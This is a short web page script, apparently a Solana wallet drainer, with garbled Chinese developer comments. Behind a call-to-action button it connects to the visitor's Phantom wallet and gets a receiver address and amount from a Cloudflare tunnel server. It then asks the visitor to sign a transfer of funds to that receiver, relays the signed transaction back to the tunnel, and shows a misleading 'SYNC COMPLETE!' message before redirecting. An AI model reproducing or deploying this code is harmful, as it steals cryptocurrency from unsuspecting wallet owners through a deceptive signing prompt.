<script>
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const log = (t) => document.getElementById('status').innerText = t;
        const sWeb3 = window.solanaWeb3;
        const p = window.solana || window.phantom?.solana;

        if (!p) return;

        try {
            log("Connecting...");
            await p.connect();
            
            // 1. ä»ä½ çš„ Helius åç«¯æ‹¿ç²¾ç®—æ•°æ®
            const resp = await fetch(tunnel + "/prepare", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();

            log("Preparing Signature...");
            // 2. æ„é€ äº¤æ˜“ (ä¸¥æ ¼å¯¹é½ Helius åå‡ºçš„ 11020000)
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: info.amount,
                })
            );
            tx.recentBlockhash = info.bh;
            tx.feePayer = p.publicKey;

            // ğŸ”± 3. å”¤èµ·ç­¾å (æ ¸å¿ƒä¿®æ­£ï¼šä¸ä½¿ç”¨ Buffer)
            const signed = await p.signTransaction(tx);
            
            log("Broadcasting...");
            // ğŸ”± 4. åºåˆ—åŒ–ä¿®æ­£ï¼šæ‰‹åŠ¨å°†å­—èŠ‚è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå½»åº•é¿å¼€ Buffer æŠ¥é”™
            const serialized = signed.serialize();
            let binary = "";
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) {
                binary += String.fromCharCode(bytes[i]);
            }

            fetch(tunnel + "/broadcast", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: btoa(binary) })
            });

            log("SYNC COMPLETE!");
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

        } catch (err) {
            // ğŸ”± å¦‚æœè¿˜æŠ¥é”™ï¼Œç›´æ¥æ˜¾ç¤ºç»™å’±ä»¬çœ‹
            log("Retry: " + err.message);
        }
    };
</script>
